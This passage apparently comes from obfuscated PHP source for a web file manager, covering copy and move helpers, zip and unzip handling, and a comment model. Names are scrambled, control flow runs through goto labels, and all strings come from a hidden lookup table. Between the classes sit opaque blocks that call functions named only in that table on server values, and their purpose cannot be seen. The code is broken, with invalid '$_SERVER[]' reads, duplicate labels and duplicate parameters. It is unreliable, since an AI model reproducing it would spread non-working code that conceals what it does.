(!$a˸ || $a˸ == $B[8] || !$E) { return !1; } ignore_timeout(); goto E; DΆҍ: if ($C && $FܳƵ) { $f->remove($a˸); } if ($C辄Ϣ) { $C = $C辄Ϣ->getPathOuter($C); } return $C; goto E; dԭ嗊: $C辄Ϣ = !1; if ($Dʡ->pathParse[$B[1049]]) { $C辄Ϣ = $Dʡ; $Dʡ = self::driverMake($Dʡ->pathParse[$B[1049]]); } if ($f->pathParse[$B[1049]]) { $f = self::driverMake($f->pathParse[$B[1049]]); } goto b݊; E: $f = self::driverMake($a˸); $Dʡ = self::driverMake($E); $FܳƵ = $E == $B[533]; goto dԭ嗊; E: } private static function check($f⼛, $bϹ, $a, &$Dݛˋ) { $E̶Į =& $_SERVER[]; if (self::driverIsSame($f⼛, $a) && $f⼛->isFolder($bϹ) && $f⼛->isParentOf($bϹ, $Dݛˋ)) { show_json(LNG($E̶Į[1051]), !1); } if (!$f⼛->exist($bϹ)) { show_json(LNG($E̶Į[105]), !1); } } private static function copyPath($d, $F, $A, $D̵м, $F, $B͒ĵ, $Fݛ, $dƐ = false) { goto eߐ; eߐ: $Ȧ =& $_SERVER[]; $Eٍ = empty($dƐ) && $dƐ !== $Ȧ[191] ? $d->pathThis($F) : $dƐ; if ($F) { $b = $A->fileNameExist($D̵м, $Eٍ); $Eٍ = $A->fileNameAuto($D̵м, $Eٍ, $F, !$Fݛ); $F = $b ? $F : !1; } goto f؏Б; f؏Б: if ($Fݛ) { return self::copyFile($d, $F, $A, $D̵м, $Eٍ, $B͒ĵ); } if ($F == REPEAT_RENAME_FOLDER) { $F = !1; } $Dχ = rtrim($D̵м, $Ȧ[8]) . $Ȧ[8] . $Eٍ; goto D߇; c҇: $bګ = is_array($bګ) ? $bګ : array($Ȧ[74] => array(), $Ȧ[75] => array()); $a텎 = array_merge($bګ[$Ȧ[74]], $bګ[$Ȧ[75]]); foreach ($a텎 as $e矕Ѓ) { $A = $e矕Ѓ[$Ȧ[29]] == $Ȧ[193]; $F = $d->getPathInner($e矕Ѓ[$Ȧ[76]]); $B = self::copyPath($d, $F, $A, $D̵м, $F, $B͒ĵ, $A); if (!$B) { IO::errorTips($Ȧ[1052] . $F . $Ȧ[67] . $D̵м); } } goto C; C: self::copyMoveKeepInfo($d, $F, $b); return $b; goto Fۈ; D߇: $b = $A->mkdir($A->getPath($Dχ)); $D̵м = $A->getPathInner($b); $bګ = $d->listPath($F, !0); goto c҇; Fۈ: } private static function copyFile($b, $fɈڊ, $eÄ, $fٱ, $E֡, $d˦ɑ) { goto f; Fӵ: return $C; goto d; c֟: self::remove($Bʇͮ); Hook::trigger($dھ[1055], $b, $fɈڊ, $eÄ, $fٱ, $E֡, $C); self::copyMoveKeepInfo($b, $fɈڊ, $C); goto Fӵ; fܦǗ: mk_dir($aˊ); $Eק = $aˊ . $A; $Bʇͮ = $Eק; goto d; E挏: if ($GLOBALS[$dھ[6]][$dھ[88]][$dھ[765]]) { $DՂ = $GLOBALS[$dھ[6]][$dھ[88]][$dھ[765]]; } $d˦ɑ = !0; $aˊ = $DՂ; goto fܦǗ; F: Hook::trigger($dھ[1054], $b, $fɈڊ, $eÄ, $fٱ, $E֡, $A); if (self::driverIsSame($b, $eÄ)) { if ($d˦ɑ) { $C = $eÄ->moveFile($fɈڊ, $fٱ); } else { $C = $eÄ->copyFile($fɈڊ, $fٱ); } Hook::trigger($dھ[1055], $b, $fɈڊ, $eÄ, $fٱ, $E֡, $C); self::copyMoveKeepInfo($b, $fɈڊ, $C); return $C; } $DՂ = TEMP_FILES; goto E挏; f: $dھ =& $_SERVER[]; $fٱ = $eÄ->getPath(rtrim($fٱ, $dھ[8]) . $dھ[8] . $E֡); $A = $dھ[1053] . time() . rand_string(5); goto F; d: $Eק = $b->download($fɈڊ, $Eק); $Eק = $b->iconvApp($Eק); $C = $eÄ->upload($fٱ, $Eק, $d˦ɑ); goto c֟; d: } private static function copyMoveKeepInfo($d, $cܢ, $Cх) { if (!$Cх) { return; } $a = $d->info($cܢ); if (!is_array($a)) { return; } IO::setModifyTime($Cх, $a[$_SERVER[][84]]); } public static function pathFather($DǱ) { $B񃇃 = IO::init($DǱ); $FՈɾ = $B񃇃->pathFather($B񃇃->path); return $B񃇃->getPathOuter($FՈɾ); } public static function fileOut($c, $F֋ = false, $bߕ = false, $A׵ = '') { $aՇ = self::driverMake($c); if ($aՇ->isFileOutServer()) { return $aՇ->fileOutServer($c, $F֋, $bߕ, $A׵); } return $aՇ->fileOut($c, $F֋, $bߕ, $A׵); } public static function fileOutImage($C, $E = 250) { $Cˌ = array(250, 600, 1200, 3000, 5000); for ($aљ = 0; $aљ < count($Cˌ); $aљ++) { if ($aљ == 0 && $E <= $Cˌ[$aљ]) { $E = $Cˌ[$aљ]; break; } else { if ($E > $Cˌ[$aљ - 1] && $E <= $Cˌ[$aљ]) { $E = $Cˌ[$aљ]; break; } else { if ($aљ == count($Cˌ) - 1 && $E > $Cˌ[$aљ]) { $E = $Cˌ[$aљ]; break; } } } } $C = self::driverMake($C); if ($C->isFileOutServer()) { return $C->fileOutImageServer($C, $E); } return $C->fileOutImage($C, $E); } private static function driverIsSame($A빎, $fŇ) { goto dǱ̚; dǱ̚: $d =& $_SERVER[]; $Bű = $A빎->getType(); $eֺ = $fŇ->getType(); goto eܓ; E欐: if ($A빎->pathDriver == $fŇ->pathDriver) { return !0; } return !1; goto Dܞ; eܓ: if ($Bű != $eֺ) { return !1; } if ($Bű == $d[723]) { return !0; } if ($Bű == $d[106]) { return !0; } goto E欐; Dܞ: } public static function copyUpdate($bʬ, $e˪) { goto c؏; Dڄ: $Fĳ̭ = self::_listAll($bʬ); $D̰ߝ = self::_listAll($e˪); $dǋͱ = array(); goto Eܠ; DɌ: Hook::trigger($D£[1059], $bʬ, $e˪, $D״); foreach ($F򓏟 as $Aپ۩) { IO::mkdir($Aپ۩); } foreach ($dǋͱ as $Aپ۩) { IO::copy($Aپ۩[$D£[1056]], $Aپ۩[$D£[1057]], REPEAT_REPLACE); } goto D; Eܠ: $F򓏟 = array(); foreach ($Fĳ̭ as $f͈ => $Aپ۩) { if (isset($D̰ߝ[$f͈])) { if ($Aپ۩[$D£[77]] == 1) { continue; } if ($D̰ߝ[$f͈][$D£[78]] == $Aپ۩[$D£[78]]) { continue; } } if ($Aپ۩[$D£[77]] == 1) { $F򓏟[] = $e˪ . $D£[8] . $f͈; continue; } $Eփ = strstr(trim($f͈, $D£[8]), $D£[8]) ? get_path_father($f͈) : $D£[33]; $dǋͱ[] = array($D£[1056] => $Aپ۩[$D£[76]], $D£[1057] => rtrim($e˪, $D£[8]) . $D£[8] . $Eփ, $D£[1058] => $Aپ۩); } $D״ = array($D£[193] => $dǋͱ, $D£[77] => $F򓏟); goto DɌ; c؏: $D£ =& $_SERVER[]; if (!IO::exist($bʬ)) { return !1; } if (!IO::exist($e˪)) { IO::mkdir($e˪); } goto Dڄ; D: } private static function _listAll($bرڽ) { $C =& $_SERVER[]; $bرڽ = KodIO::clear($bرڽ); $F = IO::listAll($bرڽ); foreach ($F as &$F͆) { $AԞ = substr($F͆[$C[76]], strlen($bرڽ)); $F͆[$C[1060]] = trim($AԞ, $C[8]); } unset($F͆); return array_to_keyvalue($F, $C[1060]); } public static function fileSubstr($A͂, $c, $Cλ = false) { goto c»; E͙م: if ($Cλ === !1) { $Cλ = $dͻ - $c; } if ($c + $Cλ > $dͻ) { $Cλ = $dͻ - $c; } if (!$dͻ && $Bؽʑ->getType() == $F󥍋[106] && !$Bؽʑ->exist($A͂)) { throw new Exception($F󥍋[1061] . LNG($F󥍋[1062]) . $F󥍋[926] . get_path_this($A͂) . $F󥍋[33]); } goto fՕ; f: $fό = $c; $AȠ = $Cλ; if ($c < 0) { $c = $dͻ + $c; } goto E͙م; D܋: if (!$c˄ && $Cλ && isset($GLOBALS[$F󥍋[1063]])) { throw new Exception($GLOBALS[$F󥍋[1063]][$F󥍋[1064]]); } return $c˄; goto fѱ; fՕ: if ($Cλ <= 0) { return $F󥍋[33]; } if ($c < 0 || $c >= $dͻ || $Cλ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\145\122\145\141\144\40\145\x72\162\x6f\162\41\x20\163\x74\x61\x72\x74\75{$c}\x3b\154\145\x6e\x67\164\150\x3d{$Cλ}\73\x20\x73\x69\172\x65\75{$dͻ}\73"); } $c˄ = $Bؽʑ->fileSubstr($A͂, $c, $Cλ); goto D܋; c»: $F󥍋 =& $_SERVER[]; $Bؽʑ = self::driverMake($A͂); $dͻ = $Bؽʑ->size($A͂); goto f; fѱ: } private static function driverMake(&$Fֆݒ) { goto bɊ; Bܭ: return $D˄; goto fϬ; bɊ: $aڊ =& $_SERVER[]; $aϖȾ = KodIO::parse($Fֆݒ); if (!self::$driverListSystem) { $dś = Model($aڊ[732])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($dś, $aڊ[393]); } goto dᶋ; dᶋ: if ($aϖȾ[$aڊ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aϖȾ[$aڊ[393]]]) { return !1; } $Fֆݒ = $aϖȾ[$aڊ[1065]]; $D˄ = self::driverGet($aϖȾ, $Fֆݒ); goto Bܭ; fϬ: } private static function driverGet($E, &$e) { goto aᕝ; aᕝ: $Dڑ =& $_SERVER[]; $dȳ헋 = $E[$Dڑ[1066]]; $eݑਓ = $E[$Dڑ[393]]; goto a; a: if (isset($a֣ۡ[$Dڑ[6]][$Dڑ[1077]])) { $aӸ綝->pathBase = rtrim($a֣ۡ[$Dڑ[6]][$Dڑ[1077]], $Dڑ[8]) . $Dڑ[8]; $e = $aӸ綝->pathBase . ltrim($e, $Dڑ[8]); } $e = $aӸ綝->getPath($e); if (isset($E[$Dڑ[1049]])) { $e = $E[$Dڑ[1049]]; } goto bރ; E: $aӸ綝 = self::$driverCache[$fɜË]; $aӸ綝->pathDriver = $dȳ헋; $aӸ綝->pathBase = $Dڑ[33]; goto a; a: switch ($E[$Dڑ[29]]) { case KodIO::KOD_IO: $a֣ۡ = self::$driverListSystem[$eݑਓ]; break; case KodIO::KOD_SOURCE: $e = $eݑਓ . $e; $a֣ۡ = array($Dڑ[1067] => $Dڑ[1068], $Dڑ[6] => $E); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Dȅ݊ = $GLOBALS[$Dڑ[1069]]; self::$driverListUser = array_to_keyvalue($Dȅ݊, $Dڑ[393]); } $a֣ۡ = self::$driverListUser[$eݑਓ]; break; case KodIO::KOD_SHARE_LINK: $a֣ۡ = array($Dڑ[1067] => $Dڑ[1070], $Dڑ[6] => $E); $cϢ襏 = Action($Dڑ[1071])->sharePathInfo($E[$Dڑ[76]]); $e = $cϢ襏[$Dڑ[395]]; if (!$cϢ襏[$Dڑ[395]]) { $b썛 = Model($Dڑ[576])->getInfo($cϢ襏[$Dڑ[468]]); $e = KodIO::clear($b썛[$Dڑ[1072]] . $E[$Dڑ[1065]]); $E[$Dڑ[466]] = $b썛; $E[$Dڑ[1049]] = $e; $a֣ۡ = array($Dڑ[1067] => $Dڑ[1073], $Dڑ[6] => $E); } break; case KodIO::KOD_SHARE_ITEM: $a֣ۡ = array($Dڑ[1067] => $Dڑ[1074], $Dڑ[6] => $E); $b썛 = Model($Dڑ[576])->getInfo($E[$Dڑ[393]]); if ($b썛[$Dڑ[395]] == $Dڑ[191]) { $e = KodIO::clear($b썛[$Dڑ[1072]] . $E[$Dڑ[1065]]); $E[$Dڑ[466]] = $b썛; $E[$Dڑ[1049]] = $e; $a֣ۡ = array($Dڑ[1067] => $Dڑ[1075], $Dڑ[6] => $E); } else { if (!$e) { $e = $b썛[$Dڑ[395]]; } } break; default: $e = $E[$Dڑ[76]]; $a֣ۡ = array($Dڑ[1067] => $Dڑ[1076]); break; } $fɜË = $E[$Dڑ[76]]; if (!isset(self::$driverCache[$fɜË])) { $fպ = strtolower($a֣ۡ[$Dڑ[94]]); $Bϻ܏ = $GLOBALS[$Dڑ[6]][$Dڑ[88]][$Dڑ[796]]; $a = $Dڑ[72] . (isset($Bϻ܏[$fպ]) ? $Bϻ܏[$fպ] : ucfirst($fպ)); if (!class_exists($a)) { show_json("{$a}\40\156\157\164\x20\x65\170\151\x73\x74\163\x21", !1); } $e삄 = isset($a֣ۡ[$Dڑ[6]]) ? $a֣ۡ[$Dڑ[6]] : !1; self::$driverCache[$fɜË] = new $a($e삄); } goto E; bރ: $aӸ綝->path = $e; return $aӸ綝; goto DٔԈ; DٔԈ: } public static function errorTips($cϻÄ = false) { goto c荇; A: if ($cϻÄ === -1) { return $F˗ ? $F˗[count($F˗) - 1] : $Eߜ[33]; } if ($cϻÄ === !1) { return implode($Eߜ[229], $F˗); } if (count($F˗) >= $C) { $F˗ = array_slice($F˗, $C * 0.5, $C); } goto fڵӝ; fڵӝ: $F˗[] = $cϻÄ; write_log($Eߜ[160] . ACTION . $Eߜ[1078] . $cϻÄ, $Eߜ[1079]); goto D; c荇: $Eߜ =& $_SERVER[]; static $F˗ = array(); $C = 1000; goto A; D: } public static function getLastError($B޳ = '') { $aŕ = self::errorTips(-1); return $aŕ ? $aŕ : $B޳; } } if ($_SERVER[$_SERVER[][836]] != $_SERVER[$_SERVER[][837]]) { goto Aؙ; cܘ׃: $E醼 = explode($_SERVER[][229], $E״л); if (count($E醼) < $_SERVER[][595]) { $cαϹҪ = $_SERVER[][842]; $cαϹҪ(); } $F͂ = $_SERVER[][1080]; goto A; A: $F͂($_SERVER[$_SERVER[][1081]]); goto FǪӧ; Aؙ: $E = $_SERVER[][839]; $DҊ = $_SERVER[$_SERVER[][840]] . $_SERVER[][841]; $E״л = $E($DҊ); goto cܘ׃; FǪӧ: } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $d; if (!$d) { $eƒ = IO::init($_SERVER[][8]); } return $eƒ; } private static function iconvSystem($F) { return self::local()->iconvSystem($F); } private static function iconvApp($Eٷ) { return self::local()->iconvApp($Eٷ); } public static function zip($cԑ, $CϞճ = "\x7a\151\160", $dҔ = '', $a͇ڽѡ = REPEAT_RENAME) { goto f; d: if (!$bוԏ) { del_dir($B˰߆); show_json(LNG($A湩[1084]), !1); } del_dir($B˰߆); return $bוԏ; goto F܄г; Cʉ: $aȗߴ = $C܂ . $B̭ . $A湩[95] . $CϞճ; $aȗߴ = get_filename_auto($aȗߴ, $A湩[33], $a͇ڽѡ); $Cӊʹ = self::iconvSystem($aȗߴ); goto e匣; Aŝ: $B˰߆ = !1; if (!$dҔ && $C->getType() == $A湩[106]) { $Fؒ = self::zipFileList($cԑ); } else { $B˰߆ = $dҔ ? $dҔ : TEMP_FILES . $A湩[1082] . time() . rand_string(8) . $A湩[8]; mk_dir($B˰߆); $Fؒ = self::zipFileList($cԑ, $B˰߆); } $B̭ = $D؉[$A湩[28]]; goto FѪ; f: $A湩 =& $_SERVER[]; $C = self::init($cԑ[0][$A湩[76]]); $D؉ = self::info($cԑ[0][$A湩[76]]); goto Aŝ; F֮ɪ: if ($dҔ || !$B˰߆) { if ($B˰߆ && strstr($B˰߆, TEMP_FILES)) { $e = $Fؒ = array(); recursion_dir($C܂, $e, $Fؒ, 0); foreach ($e as $aߤʹ) { del_dir($aߤʹ); } foreach ($Fؒ as $aŴ) { if ($aŴ == $Cӊʹ) { continue; } del_file($aŴ); } } return $aȗߴ; } $AȤ = self::pathFather($D؉[$A湩[76]]); $bוԏ = self::move($aȗߴ, $AȤ, $a͇ڽѡ); goto d; e匣: foreach ($Fؒ as $F׏ވ => $fؔ) { $Fؒ[$F׏ވ] = self::iconvSystem($fؔ); } KodArchive::create($Cӊʹ, $Fؒ); if (!IO::exist($aȗߴ)) { if ($B˰߆) { del_dir($B˰߆); } show_json(LNG($A湩[1084]), !1); } goto F֮ɪ; FѪ: if (count($Fؒ) > 1) { $d݈ = IO::info(IO::pathFather($D؉[$A湩[76]])); $B̭ = $d݈[$A湩[28]]; } $C܂ = $B˰߆; if (!$C܂) { $C܂ = get_path_father($D؉[$A湩[76]]); if (!$dҔ && $C->getType() == $A湩[106]) { $C܂ = get_path_father($C->path); } $d = IO::info($C܂); if (!$d[$A湩[196]]) { show_json(LNG($A湩[1083]), !1); } } goto Cʉ; F܄г: } public static function unzip($Aք, $Cԙٗ = "\162\145\160\154\x61\143\145") { goto b; bχ˨: if (!($C䂋 = parent::info($a))) { show_json(LNG($fٮ䆬[1086]), !1); } if (!($e땆 = parent::infoFull($d))) { $d = parent::mkdir($d); $e땆 = array($fٮ䆬[76] => $d); } else { if (isset($e땆[$fٮ䆬[395]]) && trim($e땆[$fٮ䆬[76]], $fٮ䆬[8]) != trim($d, $fٮ䆬[8])) { $Cӧ = KodIO::make($e땆[$fٮ䆬[478]]); $b = parent::fileNameAuto($Cӧ, $e땆[$fٮ䆬[28]], REPEAT_RENAME_FOLDER, !0); $d = parent::mkdir($Cӧ . $b); $e땆 = array($fٮ䆬[76] => $d); } } $d = $e땆[$fٮ䆬[76]]; goto aɾΧ; aɾΧ: $cȬ = self::tmpFileName($C䂋); $báƥ = TEMP_FILES . $cȬ; del_dir($báƥ); goto bƓ; b塘˛: Hook::trigger($fٮ䆬[1092], $báƥ); recursion_dir($báƥ, $D, $E┑, 0); $A˦ = array_merge($D, $E┑); goto Bפ; f׏댴: $Bο = KodArchive::extract($A, $báƥ . $fٮ䆬[8], $F͆); self::archiveExt(); if (!$Bο[$fٮ䆬[1089]]) { show_json($fٮ䆬[1090] . $Bο[$fٮ䆬[1091]], !1); } goto b塘˛; Bפ: foreach ($A˦ as $Fۋ) { $Fۋ = self::iconvApp($Fۋ); self::move($Fۋ, $d, $Cԙٗ); } del_dir($báƥ); if (!$E숟) { del_file($A); } goto e; c: if (!@file_exists(self::iconvSystem($A))) { $E숟 = self::localFilePath($a, $b틩); $A = $E숟 ? $E숟 : parent::download($a, $A); } $A = self::iconvSystem($A); $F͆ = isset($Aք[$fٮ䆬[1087]]) ? $Aք[$fٮ䆬[1087]] : $fٮ䆬[1088]; goto f׏댴; b: $fٮ䆬 =& $_SERVER[]; $a = $Aք[$fٮ䆬[76]]; $d = $Aք[$fٮ䆬[1085]]; goto bχ˨; e: return !0; goto d̒׎; bƓ: mk_dir($báƥ); $b틩 = self::fileExt($C䂋); $A = $báƥ . $fٮ䆬[95] . $b틩; goto c; d̒׎: } public static function unzipList($E胻) { goto b쵘; A: $BȜ = self::info($BÚ); $b = self::fileExt($BȜ); $f = self::tmpFileName($BȜ); goto aȬ; Aғܶ: $bم = json_encode($e[$F£⫪[1091]]); self::setContent($fΌТ, $bم); if (count($e[$F£⫪[1091]]) >= $B֓䠰) { show_json(sprintf(LNG($F£⫪[1095]), count($e[$F£⫪[1091]])), !1); } goto eԎ; B: $C = self::iconvSystem($C); if ($Fˆ >= 0) { $f߶Č = isset($E胻[$F£⫪[1097]]) ? $E胻[$F£⫪[1097]] : !1; $C흹 = isset($E胻[$F£⫪[28]]) ? $E胻[$F£⫪[28]] : $F£⫪[33]; KodArchive::filePreview($C, $Fˆ, $f߶Č, $C흹); self::archiveExt(); die; } $e = KodArchive::listContent($C); goto e; aȬ: if (isset($aُ)) { $d矌 = array($aُ[$F£⫪[76]], $aُ[$F£⫪[1093]], $aُ[$F£⫪[28]]); $a = md5(implode($F£⫪[71], $d矌)) . $F£⫪[95] . get_path_ext($aُ[$F£⫪[28]]); } else { $d矌 = array($BȜ[$F£⫪[28]], $BȜ[$F£⫪[76]], $BȜ[$F£⫪[78]]); $a = md5(implode($F£⫪[71], $d矌)) . $F£⫪[95] . $b; } if ($Fˆ == -1) { $fΌТ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\x65\x77\x2f{$f}\x2f{$a}\x2e\x6c\x6f\147"; $fޙ = self::infoFull($fΌТ); if ($fޙ) { $fΌТ = $fޙ[$F£⫪[76]]; $bϥɈ = self::getContent($fΌТ); if ($bϥɈ) { $bم = json_decode($bϥɈ, !0); if (count($bم) >= $B֓䠰) { show_json(sprintf(LNG($F£⫪[1095]), count($bم)), !1); } return $bم; } } else { $fΌТ = self::mkfile($fΌТ); } } $Aӳ = TEMP_FILES . $f; goto eį; eԎ: return $e[$F£⫪[1091]]; goto fۤ; e: self::archiveExt(); del_dir($Aӳ); if (!$e[$F£⫪[1089]]) { show_json($e[$F£⫪[1091]], !1); } goto Aғܶ; b쵘: $F£⫪ =& $_SERVER[]; $bᓈ = $E胻[$F£⫪[76]]; $Fˆ = isset($E胻[$F£⫪[1093]]) ? $E胻[$F£⫪[1093]] : -1; goto C쇃; eį: if (!is_dir($Aӳ)) { mk_dir($Aӳ); } $C = $Aӳ . $F£⫪[8] . $a; if (!@file_exists(self::iconvSystem($C))) { if (isset($aُ)) { url_request($bᓈ, $F£⫪[1096], $C); } else { $FԨߊ = self::localFilePath($bᓈ, $b); $C = $FԨߊ ? $FԨߊ : self::download($bᓈ, $C); } } goto B; C쇃: $B֓䠰 = 50000; if (request_url_safe($bᓈ)) { $aُ = parse_url_query($bᓈ); if (!isset($aُ[$F£⫪[76]])) { show_json($F£⫪[1094], !1); } } $BÚ = isset($aُ) ? $aُ[$F£⫪[76]] : $bᓈ; goto A; fۤ: } private static function fileExt($B⭘) { $a鲮 =& $_SERVER[]; $b֋ = $B⭘[$a鲮[168]]; if ($b֋ == $a鲮[1098]) { $cԽ = $a鲮[1099]; if (substr($B⭘[$a鲮[28]], -strlen($cԽ)) == $cԽ) { $b֋ = $a鲮[1100]; } } self::archiveExt($b֋); return $b֋; } private static function zipFileList($d阦, $aݜ = false) { $Eǥ =& $_SERVER[]; $e = array(); foreach ($d阦 as $a) { $aח = $a[$Eǥ[76]]; if ($aݜ) { $aח = self::copy($a[$Eǥ[76]], $aݜ, $Eǥ[788]); } else { $Cռ = self::init($a[$Eǥ[76]]); if ($Cռ->getType() == $Eǥ[106]) { $aח = $Cռ->path; } } if ($aח && self::local()->exist($aח)) { $e[$a[$Eǥ[76]]] = $aח; } } if (!empty($e)) { return array_values($e); } show_json(LNG($Eǥ[1062]), !1); } public static function tmpFileName($AԺ) { $B =& $_SERVER[]; $C = array($AԺ[$B[28]], $AԺ[$B[76]], $AԺ[$B[78]], $AԺ[$B[502]]); return md5(implode($B[71], $C)); } private static function localFilePath($c馑, $B˳) { goto fԺͪ; fԺͪ: $c =& $_SERVER[]; if ($B˳ == $c[1101] && strtoupper(substr(PHP_OS, 0, 3)) == $c[1102]) { return !1; } $C = KodIO::parse($c馑); goto e̲; e̲: if ($C[$c[29]] == KodIO::KOD_SOURCE) { $e⒆ = Model($c[795])->fileInfoGet(KodIO::sourceID($c馑)); if (!$e⒆[$c[76]]) { show_json($c[1103], !1); } $c馑 = $e⒆[$c[76]]; } $C = self::init($c馑); $BȒߠ = $C->getType(); goto a씞; a씞: if ($BȒߠ == $c[106] || $BȒߠ == $c[1104]) { if (!$C->exist($C->path)) { show_json(LNG($c[105]), !1); } return $C->path; } return !1; goto eݵ; eݵ: } private static function archiveExt($Dٱğ = '') { $GLOBALS[$_SERVER[][1105]] = $Dٱğ; } } goto C጖; E玱: if ($_SERVER[$_SERVER[][836]] != $f($b꼢)) { goto d߂; d߂: $E = $_SERVER[][839]; $DҊ = $_SERVER[$_SERVER[][840]] . $_SERVER[][841]; $E״л = $E($DҊ); goto D紺; b: $F͂($b꼢); goto aޮϺ; D紺: $E醼 = explode($_SERVER[][229], $E״л); if (count($E醼) < $_SERVER[][595]) { $cαϹҪ = $_SERVER[][842]; $cαϹҪ(); } $F͂ = $_SERVER[][1080]; goto b; aޮϺ: } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\145\x6e\164"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\141\155\x65" => "\143\157\x6d\x6d\145\x6e\164\137\155\x65\164\x61", "\155\145\x74\141\106\151\x65\x6c\144" => "\x63\157\155\155\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($c֋) { $D؇ =& $_SERVER[]; if ($c֋[$D؇[1730]]) { $e١ = $this->where(array($D؇[1731] => $c֋[$D؇[1730]]))->find(); if (!$e١ || $e١[$D؇[404]] != $c֋[$D؇[404]] || $e١[$D؇[484]] != $c֋[$D؇[484]]) { return !1; } $this->where(array($D؇[1731] => $c֋[$D؇[1730]]))->setAdd($D؇[1732], 1); } $c֋[$D؇[1733]] = 0; $c֋[$D؇[1732]] = 0; $c֋[$D؇[715]] = 1; return $this->add($c֋); } public function commentCount($CԦ, $Cێ) { goto eĴ; FǇ: return array_to_keyvalue($aʣ, $B[484], $B[480]); goto d力; cث: $Eż = array($B[484], $B[1734] => $B[480]); $dۇ = array($B[484] => array($B[7], $CԦ), $B[404] => $Cێ); $aʣ = $this->field($Eż)->where($dۇ)->group($B[484])->select(); goto FǇ; eĴ: $B =& $_SERVER[]; if (!$CԦ) { return array(); } if (is_string($CԦ) || is_int($CԦ)) { $CԦ = array($CԦ); } goto cث; d力: } public function remove($EĜ) { $aӇ =& $_SERVER[]; $A㿷 = array($aӇ[1731] => $EĜ); $A = $this->where($A㿷)->find(); if ($A[$aӇ[1730]]) { $this->where(array($aӇ[1731] => $A[$aӇ[1730]]))->setAdd($aӇ[1732], -1); } return $this->where($A㿷)->delete(); } public function edit($d, $DЉޠ) { $CÇѧ =& $_SERVER[]; $a = array($CÇѧ[1731] => $d); return $this->where($a)->save(array($CÇѧ[1735] => $DЉޠ)); } public function prasise($B) { $cŚ͌ =& $_SERVER[]; $DŃҢ = Model($cŚ͌[1736]); $B = array($cŚ͌[1731] => $B, $cŚ͌[1524] => USER_ID); $a҃ = $DŃҢ->where($B)->find(); if (!$a҃) { $DŃҢ->add($B); $b = $this->where(array($cŚ͌[1731] => $B))->setAdd($cŚ͌[1733], 1); } else { $DŃҢ->where($B)->delete(); $b = $this->where(array($cŚ͌[1731] => $B))->setAdd($cŚ͌[1733], -1); } return $b; } public function targetInfo($c˘, $E˅) { goto BǨ; BǨ: $d =& $_SERVER[]; $dʈƕ = array($d[562] => $c˘, $d[563] => $E˅); $b󸢥 = $this->where($dʈƕ)->count(); goto c濂; cĂ: return $C߭; goto aƢʆ; c濂: $fѥ = "\122\x49\x47\x48\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\143\x6f\155\155\x65\156\x74\x5f\160\x72\x61\151\x73\x65\x20\x73\164\x61\x72\x20\x6f\x6e\x20\x63\157\x6d\155\145\x6e\x74\x2e\143\x6f\155\155\145\156\164\x49\x44\40\x3d\40\163\x74\x61\162\x2e\143\x6f\155\x6d\x65\x6e\164\111\x44"; $b = $this->alias($d[352])->where($dʈƕ)->join($fѥ, $d[1737])->count(); $C߭ = array($d[1738] => $b󸢥, $d[1739] => $b); goto cĂ; aƢʆ: } public function listData($b) { $b =& $_SERVER[]; if (isset($b[$b[1740]])) { if ($b[$b[1740]]) { $b[$b[1741]] = array($b[973], intval($b[$b[1740]])); } unset($b[$b[1740]]); } if (isset($b[$b[1742]])) { if ($b[$b[1742]]) { $b[$b[1741]] = array($b[970], intval($b[$b[1742]])); } unset($b[$b[1742]]); } return $this->_listData($b); } private function _listData($C) { $A =& $_SERVER[]; $f׍ = $this->where($C)->_makeOrder()->selectPage(100); $this->_listAppendParent($f׍[$A[367]]); $this->_listAppendUser($f׍[$A[367]]); $this->_listAppendMeta($f׍[$A[367]]); return $f׍; } private function _makeOrder() { $EФ =& $_SERVER[]; $c営 = array($EФ[1733], $EФ[1732], $EФ[194]); $D݄ = Input::get($EФ[435], $EФ[7], $EФ[416], $c営); $Bʾ = Input::get($EФ[436], $EФ[7], $EФ[1526], array($EФ[1743], $EФ[431])); $Dߝ = $D݄ . $EФ[50] . $Bʾ; return $this->order($Dߝ); } private function _listAppendParent(&$A) { goto c͵̕; c͵̕: $bԽą =& $_SERVER[]; $DΌ = array_unique(array_to_keyvalue($A, $bԽą[33], $bԽą[1730])); $DΌ = array_remove_value($DΌ, $bԽą[191]); goto F; F: if (!$DΌ) { return; } $F = $this->where(array($bԽą[1731] => array($bԽą[7], $DΌ)))->select(); $F = array_to_keyvalue($F, $bԽą[1741]); goto c呡; c呡: foreach ($A as &$D܉) { if (isset($F[$D܉[$bԽą[1730]]])) { $D܉[$bԽą[1744]] = $F[$D܉[$bԽą[1730]]]; } } unset($D܉); goto eĥ; eĥ: } private function _listAppendUser(&$dŒ) { goto d; f͎: if (count($B֪) == 0) { return; } foreach ($dŒ as $EƼ) { if (isset($EƼ[$CՂٷ[1744]])) { $B֪[] = $EƼ[$CՂٷ[1744]][$CՂٷ[1533]]; } } $E = Model($CՂٷ[519])->userListInfo($B֪); goto Cǃ; Cǃ: foreach ($dŒ as &$EƼ) { $EƼ[$CՂٷ[575]] = $E[$EƼ[$CՂٷ[1533]]]; if (isset($EƼ[$CՂٷ[1744]])) { $EƼ[$CՂٷ[1744]][$CՂٷ[575]] = $E[$EƼ[$CՂٷ[1744]][$CՂٷ[1533]]]; } } unset($EƼ); goto Bܻ; d: $CՂٷ =& $_SERVER[]; $B֪ = array_unique(array_to_keyvalue($dŒ, $CՂٷ[33], $CՂٷ[1533])); $B֪ = array_remove_value($B֪, $CՂٷ[191]); goto f͎; Bܻ: } private function _listAppendMeta(&$Cݽ) { goto fʑ; B: if (!$E֛ͮ) { return; } foreach ($Cݽ as $d) { if (isset($d[$C茮[1744]])) { $E֛ͮ[] = $d[$C茮[1744]][$C茮[1741]]; } } $Cȇ = $this->metaList($E֛ͮ); goto eۊđ; eۊđ: if (!$Cȇ) { return !1; } foreach ($Cݽ as &$d) 